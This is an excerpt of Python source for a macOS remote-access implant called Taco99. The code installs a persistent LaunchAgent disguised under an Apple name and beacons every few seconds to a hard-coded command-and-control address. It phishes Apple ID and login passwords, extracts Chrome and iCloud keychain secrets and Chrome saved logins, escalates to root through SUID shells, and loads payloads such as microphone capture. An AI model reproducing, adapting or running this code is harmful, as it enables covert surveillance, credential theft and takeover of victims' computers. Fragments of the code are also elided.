...
development = False
def create_taco99_helpers(launch_agent_name, taco99_folder, home_path):
	...
	<dict>
		...
		<array>
			<string>%s/Library/%s/Taco99</string>
		</array>
		<key>StartInterval</key>
		<integer>5</integer>    
	</dict>
	</plist>\n""" % (launch_agent_name, home_path, taco99_folder)
	...
	if not os.path.isdir('%s/Library/%s/' % (home_path, taco99_folder)):
		os.makedirs('%s/Library/%s/' % (home_path, taco99_folder))
	if development:
		with open(__file__, 'rb') as content:
			with open('%s/Library/%s/Taco99' % (home_path, taco99_folder), 'wb') as binary:
				binary.write(content.read())
	else:
		os.rename(__file__, '%s/Library/%s/Taco99' % (home_path, taco99_folder))
	os.chmod('%s/Library/%s/Taco99' % (home_path, taco99_folder), 0777)
...
def readDB(column, payload=False):
	...
	conn = sqlite3.connect('%staco99.db' % get_taco99_path()) #will create if doesnt exist
	c = conn.cursor()
	if payload:
		c.execute("SELECT %s FROM payloads WHERE id = 1" % column)
	else:
		c.execute("SELECT %s FROM taco99 WHERE id = %s" % (column, taco99_UID))
	try:
		value = c.fetchone()[0]
		if value == None:
			return False
...
def updateDB(data, column):
	...
	if not os.path.isfile("%staco99.db" % get_taco99_path()):
		creator = createDB()
		if not creator[0]:
			return (False, "Error creating database! [%s]" % creator[1])
	conn = sqlite3.connect('%staco99.db' % get_taco99_path()) #will create if doesnt exist
	c = conn.cursor()
	c.execute("SELECT * FROM taco99 WHERE id = %s" % taco99_UID)
	if len(c.fetchall()) == 0: #then that user is not yet in our DB, so let's create them
		c.execute("INSERT INTO taco99 (id, username) VALUES (%s, '%s')" % (taco99_UID, get_taco99_user()))
	c.execute("UPDATE taco99 set %s = '%s' WHERE id = %s" % (column, data, taco99_UID))
	conn.commit()
	conn.close()
	return (True, '')
...
def createDB():
	try:
		conn = sqlite3.connect('%staco99.db' % get_taco99_path()) #will create if doesnt exist
		c = conn.cursor()
		c.execute("CREATE TABLE taco99 (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, text)")
		...
		if e[0] == "table taco99 already exists":
			return (True, e)
		else:
...
def appleIDPhish(username, GUIUser):
	global taco99Connection
	while True:
		### CTRLC listener
		taco99Connection.settimeout(0.0) 
		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
			if recv_msg(taco99Connection) == 'sigint9kill':
				sys.stdout.flush()
				send_msg('terminated', True) #send back confirmation along with STDERR
				done = True
				taco99Connection.settimeout(None)
				return 1
...
def chrome_safe_storage():
	...
	while True:
		...
		encryptionKey = check_output("launchctl asuser %s security find-generic-password -wa 'Chrome' '%s'" % (taco99_UID, kchain)) #get rid of \n
...
def get_iTunes_accounts():
	iClouds = globber("/Users/%s/Library/Accounts/Accounts3.sqlite" % get_taco99_user()) #we are only interested in the current GUI user
	returnList = []
	for x in iClouds:
...
def resetUIDandName(): #if we are root we want to update the variable accordingly
	global taco99_user, helper_location, taco99_UID
	if os.getuid() == 0:
		taco99_user = cur_GUI_user()
		taco99_UID = pwd.getpwnam(taco99_user).pw_uid
...
def initialize_socket():
	...
	output = check_output('scutil --get LocalHostName; echo %s; pwd; echo %s' % (get_taco99_user(), readDB('lastLogin')))
	if output[0]:
		basicInfo += output[1]
	else:
		return check_output("echo 'bareNeccesities'; scutil --get LocalHostName; whoami; pwd")[1]
	
	output = check_output('ps -p %s -o etime=' % taco99PID)
	if output[0]:
		basicInfo += output[1]
	else:
		return check_output("echo 'bareNeccesities'; scutil --get LocalHostName; whoami; pwd")[1]
...
def manual():
	...
	value += "\n%sGet Root%s\nAttempt to escalate Taco99 to root through a variety of attack vectors.\nUsage: %sget_root%s\nRequirements: None\n" % (underline + bold + red, endANSI, bold, endANSI)
	...
	value += "\n%sTaco99 Info%s\nExtensively details information about the user and information from the Taco99 instance.\nUsage: %staco99_info%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	...
	value += "\n%sShutdown Server%s\nUnloads Taco99 from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
...
def kciCloudHelper(iCloudKey):
	...
	IV = 16 * '0'
	mme_token_file = glob("/Users/%s/Library/Application Support/iCloud/Accounts/*" % get_taco99_user()) #this doesnt need to be globber bc only current user's info can be decrypted
...
def getKeychains():
	send_msg("%sFound the following keychains for [%s]:\n" % (yellow_star, get_taco99_user()), False)
	kchains = glob("/Users/%s/Library/Keychains/login.keychain*" % get_taco99_user())
	for x in kchains:
		send_msg("\t[%s]\n" % x, False)
	if len(kchains) == 0:
		send_msg("%sNo Keychains found for [%s].\n" % (yellow_star, get_taco99_user()), True)
		return
	kchain = kchains[-1]
	for x in kchains:
		if x.endswith('-db'):
...
def taco99_info():
	...
	send_msg("%sShell location: [%s].\n" % (blue_star, get_taco99_path()), False)
	...
	if not systemVersion.startswith("10.12"):
		...
		if os.getuid() == 0:
			send_msg("%sTaco99 is running as root.\n" % greenPlus, False)
	...
	if not sipEnabled: #sipDisabled allows us to check like .1% of cases where user is on El Cap and has opted out of SIP
		if is_there_SUID_shell():
			...
			if not kcpayload:
				send_msg("%sError reading KCDump payload from Taco99 Database.\n" % red_minus, False)
			else:
				...
				if success: 
					...
					if not readDB('mme_token'):
						...
						if iCloud[1]:
							...
							if not decrypted:
								...
								send_msg("\t%sDecrypted. Updating Taco99 database.\n" % blue_star, False)
					...
					if not readDB('chromeSS'):
						...
						if chrome[1]:
							send_msg("\t%sGot Chrome Key! Updating Taco99 DB.\n" % yellow_star, False)
							updateDB(encrypt(chrome[0]), 'chromeSS')
							send_msg("\t%sUpdated DB.\n" % greenPlus, False)
				else:
					send_msg("%sError finding %slogin%s master key for user [%s].\n\t%s\n" % (red_minus, bold, endANSI, get_taco99_user(), msg), False)
...
def migrateToRoot(rootsPath):
	...
	### in order to test this function in development, taco99 must be installed through the INSTALLER script generated by BUILDER
	
	relativeTaco99Path = '/' + '/'.join(get_taco99_path().split("/")[3:])

	if not os.path.isfile('%staco99.db' % get_taco99_path()): #if we can execute this path
		send_msg("Migration aborted. Could not find taco99.db in\n\t[%s]" % get_taco99_path(), False)
		return
	if not os.path.isfile('%sTaco99' % get_taco99_path()): #if we can execute this path
		send_msg("%sMigration halted. Could not find Taco99 binary in:\n\t[%s].\n" % (red_minus, get_taco99_path()), False)
		return
	if not os.path.isfile('/Users/%s/Library/LaunchAgents/%s.plist' % (get_taco99_user(), launch_agent_name)): #if we can execute this path
		send_msg("%sMigration halted. Could not find LaunchAgent in:\n\t[/Users/%s/Library/LaunchAgents/%s.plist].\n" % (red_minus, get_taco99_user(), launch_agent_name), False)
		return

	"""Create new taco99 location in /Library"""
	error = Popen("%s \"mkdir -p '%s'\"" % (rootsPath, relativeTaco99Path), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '':
		send_msg("%sError creating path:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sCreated path '%s'.\n" % (blue_star, relativeTaco99Path), False)

	"""Copy taco99 database from current helper_location to new one in /Library"""
	error = Popen("%s \"cp '%staco99.db' '%staco99.db'\"" % (rootsPath, get_taco99_path(), relativeTaco99Path), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '':
		send_msg("%sError copying Taco99 DB:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sCopied Taco99 DB '%staco99.db' to '%staco99.db'.\n" % (blue_star, get_taco99_path(), relativeTaco99Path), False)
	
	"""Copy taco99 binary from current helper_location to new one in /Library"""
	error = Popen("%s \"cp '%sTaco99' '%sTaco99'\"" % (rootsPath, get_taco99_path(), relativeTaco99Path), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if  error != '':
		send_msg("%sError copying Taco99 binary:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sCopied Taco99 binary '%sTaco99' to '%sTaco99'.\n" % (blue_star, get_taco99_path(), relativeTaco99Path), False)
	
	"""Copy taco99 launch_agent_name from current one to new one in /Library/LaunchDaemons"""
	error = Popen("%s \"cp '/Users/%s/Library/LaunchAgents/%s.plist' '/Library/LaunchDaemons/%s.plist'\"" % (rootsPath, get_taco99_user(), launch_agent_name, launch_agent_name), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '': #cp taco99 db to /Library (root location)
		send_msg("%sError copying launchagent '/Users/%s/Library/LaunchAgents/%s.plist' to '/Library/LaunchDaemons/%s.plist'.\n" % (red_minus, get_taco99_user(), launch_agent_name, launch_agent_name), False)
		return
	else:
		send_msg("%sCopied launchagent '/Users/%s/Library/LaunchAgents/%s.plist' to '/Library/LaunchDaemons/%s.plist'.\n" % (blue_star, get_taco99_user(), launch_agent_name, launch_agent_name), False)

	"""Replace path to taco99 binary in the new launchDaemon"""
	error = Popen("%s \"sed -i \'\' -e 's@/Users/%s/Library/@/Library/@' /Library/LaunchDaemons/%s.plist\"" % (rootsPath, get_taco99_user(), launch_agent_name), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '':
...
def removeServer():
	subprocess_cleanup()
	destroyer = "rm -rf %s" % get_taco99_path()
	if os.getuid() == 0:
		destroyer += "; rm -f /Library/LaunchDaemons/%s.plist" % (launch_agent_name)
	else:
		destroyer += "; rm -f /Users/%s/Library/LaunchAgents/%s.plist" % (get_taco99_user(), launch_agent_name)
	os.system(destroyer)
...
def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
	...
	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
		binarymake = make_SUID_root_binary(None, '%sexecuter/root_shell.sh' % get_taco99_path())
		if binarymake[0]:
...
def tokenForce():
	...
	while True: #no token exists, begin blast
		...
		iCloudKey = check_output("launchctl asuser %s security find-generic-password -ws 'iCloud' '%s'" % (taco99_UID, kchain))
		if not iCloudKey[0]:
			if 51 == iCloudKey[2]:
				send_msg("%sUser clicked deny.\n" % red_minus, False)
				continue
...
def send_msg(msg, EOF):
	...
	taco99Connection.sendall(finalMsg) #send serialized
...
def user_pass_phish():
	...
	while True:
		...
		if verifyPassword(userTB, password):
			...
			send_msg("%sUsing this password to root Taco99.\n" % yellow_star, False)
			rooter()
			return 1
		else:
...
def taco99(*Emma):
	### We start with having taco99 only work for the user who initially runs it ###
	### For now, we will assume that the initial user to run Taco99 is NOT root ###
	...
	if not os.path.isdir(get_taco99_path()):
		os.makedirs(get_taco99_path())
	creator = createDB() #createDB will reference the global whoami
	if not creator[0]:

		pass

	os.chdir("/Users/%s/" % get_taco99_user())
	...
	while True:
		...
		taco99Connection = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
		
		try:

			taco99Connection.connect((host,port))
		...
		while True:
			try:
				...
				data = recv_msg(taco99Connection)
				...
				if not data:
					...
					if inject_payloads(payloads_encoded):
						send_msg('Injected payloads into Taco99.\n', False)
					...
					if not reader:
						send_msg('%sError reading Microphone payload from Taco99 DB.\n' % red_minus, True)
					else:
					...
					if isinstance(checkChrome, str):
						...
						loginData = glob("/Users/%s/Library/Application Support/Google/Chrome/*/Login Data" % get_taco99_user()) #dont want to do all
						for x in loginData:
					...
					try:
						...
						if not blocking:
							...
							while proc.poll() == None:
								taco99Connection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
								try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
									if recv_msg(taco99Connection) == 'sigint9kill':
										sys.stdout.flush()
										proc.terminate()
				...
				taco99_error = traceback.format_exc()

				send_msg('%sMalfunction:\n```\n%s%s%s\n```\n' % (red_minus, red, taco99_error, endANSI), True) #send error to CC, then continue
				continue
		try:
			taco99Connection.close()
		except:
			pass

##### Below variables are global scopes that are accessed by most of the methods in Taco99. Should make a class structure #####
...
if os.getuid() == 0:
	...
	taco99_user = getpass.getuser()
	taco99_UID = pwd.getpwnam(taco99_user).pw_uid

taco99PID = os.getpid()

launch_agent_name = 'com.apple.Taco99'
taco99_folder = 'Containers/.taco99'
if os.getuid() == 0:
	home_path = ''
else:
	home_path = os.path.expanduser('~')

if '/'.join(os.path.abspath(__file__).split('/')[:-1]).lower() != ('%s/Library/%s' % (home_path, taco99_folder)).lower(): #then set up and load agents, etc


	create_taco99_helpers(launch_agent_name, taco99_folder, home_path)

helper_location = '/'.join(os.path.abspath(__file__).split('/')[:-1]) + '/'
payload_list = []
temp_file_list = []
host = '192.168.10.105' #Command and Control IP (listener will run on)
port = 4545 #What port Taco99 will operate over
